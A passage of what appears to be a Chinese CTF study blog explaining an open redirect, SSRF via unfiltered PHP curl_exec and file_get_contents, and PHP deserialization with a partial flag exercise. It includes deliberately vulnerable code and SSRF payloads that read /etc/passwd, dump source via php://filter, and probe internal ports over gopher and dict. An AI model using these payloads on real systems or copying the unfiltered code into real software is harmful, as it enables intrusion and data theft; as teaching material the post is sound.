punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$url</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p>好的,希望你能坚持做你自己!&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$url</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SSRF（服务端请求伪造）"><a href="#SSRF（服务端请求伪造）" class="headerlink" title="SSRF（服务端请求伪造）"></a>SSRF（服务端请求伪造）</h2><blockquote><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)，其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制</p><p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p><p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p><p>简单理解：服务器接受了客户端输入的URL，然后服务器端拿URL去请求并返回给你。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PHP</span>中下面函数的使用不当会导致<span class="token argument-name">SSRF</span><span class="token punctuation">:</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>如果一定要通过后台服务器远程去对用户指定<span class="token punctuation">(</span><span class="token string double-quoted-string">"或者预埋在前端的请求"</span><span class="token punctuation">)</span>的地址进行资源请求<span class="token punctuation">,</span>则请做好目标地址的过滤。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><blockquote><p>PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</p><p>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP  基于表单的上传、代理、cookies和用户名+密码的认证。</p><p>PHP中使用cURL实现Get和Post请求的方法</p><p>这些函数在PHP 4.0.2中被引入。</p></blockquote><p><a href="https://www.runoob.com/php/php-ref-curl.html">菜鸟教程curl</a></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;file协议读取 ?url&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;jwt.txt &#x2F;&#x2F;gopher协议 &#x2F;&#x2F;基本协议格式：URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流 ?url&#x3D;gopher:&#x2F;&#x2F;119.23.243.154:22 &#x2F;&#x2F;dict协议 ?url&#x3D;dict:&#x2F;&#x2F;119.23.243.154:22 &#x2F;&#x2F;http&#x2F;https协议 ?url&#x3D;http:&#x2F;&#x2F;x.x.x.x&#x2F; ?url&#x3D;https:&#x2F;&#x2F;x.x.x.x&#x2F; &#x2F;&#x2F;探测内网其他主机的端口 ?url&#x3D;http:&#x2F;&#x2F;x.x.x.x:port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把url改成baidu</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214215750855.png"></p><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//payload:</span><span class="token comment">//file:///etc/passwd  读取文件</span><span class="token comment">//http://192.168.1.15:22 根据banner返回,错误提示,时间延迟扫描端口</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span>    <span class="token variable">$URL</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$CH</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$RES</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span><span class="token comment">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span><span class="token comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h3><p>file_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p><p>基础语法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>include_path<span class="token punctuation">,</span>context<span class="token punctuation">,</span>start<span class="token punctuation">,</span>max_length<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要读取的文件。</td></tr><tr><td>include_path</td><td>可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。</td></tr><tr><td>start</td><td>可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。</td></tr><tr><td>max_length</td><td>可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。</td></tr></tbody></table><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span><span class="token comment">//内网请求:http://x.x.x.x/xx.index</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化学习</title>
      <link href="2021/lou-dong/php-fan-xu-lie-hua/"/>
      <url>2021/lou-dong/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>首先，从php的序列化入手</p><p>PHP 的所谓的序列化是一个将各种类型的数据，压缩并按照一定格式存储的过程，用到的函数是serialize()</p><p>主要是以下两个函数</p><pre class="line-numbers language-none"><code class="language-none">serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串unserialize()   &#x2F;&#x2F;将字符串还原成一个对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过序列化和反序列化可以在php中方便的传递对     象</p><p><strong>记住重要的一点，序列化只序列化属性，类里面的属性是不会被序列化的</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"kkk"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201707028.png" alt="image-20210208201707028"></p><pre class="line-numbers language-none"><code class="language-none">一些字符缩写a - array                  b - boolean  d - double                 i - integero - common object          r - references - string                 C - custom objectO - class                  N - nullR - pointer reference      U - unicode string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有个小细节，可以看到flag那个属性原来是4个字符的，序列化之后还是4个字符；但Testname明明是8个字符，但却显示10个字符通过查资料后发现和自己定义的类的属性有关。</p><p>默认的Public属性，序列化之后还是不变的，长度是多少就是多少</p><p>但Private属性序列化后的格式是：<code>%00类名%00属性名</code> 也就是说私有属性序列化的结果是在类名和属性名的前面加个空白符给他们分隔开</p><p>而Protect属性的格式则是：<code>%00*%00属性名</code>  这样做或许是为了更好的区分不同的属性类型吧，具体作用还不是很清楚</p><p>序列化和反序列化类似与压缩和解压的过程，所以反序列化就是把序列化后的字符串还原成原来的状态的过程</p><p>随便拿一串序列化后的字符串来反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D'</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208211045455.png" alt="image-20210208211045455"></p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p><p>下面是一些常见的方法</p><pre class="line-numbers language-none"><code class="language-none">__construct()&#x2F;&#x2F;创建对象时触发__destruct() &#x2F;&#x2F;对象被销毁时触发__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发__get() &#x2F;&#x2F;用于从不可访问的属性读取数据__set() &#x2F;&#x2F;用于将数据写入不可访问的属性__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发__invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p></blockquote><p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p>举个 例子加深理解</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Caiji</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$ID</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">ID</span> <span class="token operator">=</span> <span class="token variable">$ID</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sex</span> <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">info</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ID: %s, age: %d, sex: %s"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">ID</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sex</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">info</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * serialize前调用 用于删选需要被序列化存储的成员变量     * @return array [description]     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'ID'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * unserialize前调用 用于预先准备对象资源     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">info</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ID: %s, age: %d, sex: %s"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">ID</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sex</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$me</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Caiji</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'twosmi1e'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$me</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//存在__sleep(函数，$info属性不会被存储</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$me</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$temp</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$me</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//__wakeup()组装的$info</span><span class="token variable">$me</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201751912.png" alt="image-20210208201751912"></p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$ID</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">ID</span> <span class="token operator">=</span> <span class="token variable">$ID</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sex</span> <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">info</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ID: %s, age: %d, sex: %s"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">ID</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sex</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">info</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$me</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'smi1e'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'__toString:'</span> <span class="token operator">.</span> <span class="token variable">$me</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201815930.png" alt="image-20210208201815930"></p><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><h4 id="以前做过的一个题"><a href="#以前做过的一个题" class="headerlink" title="以前做过的一个题"></a>以前做过的一个题</h4><p>主要代码为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据题目要求序列化一下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span 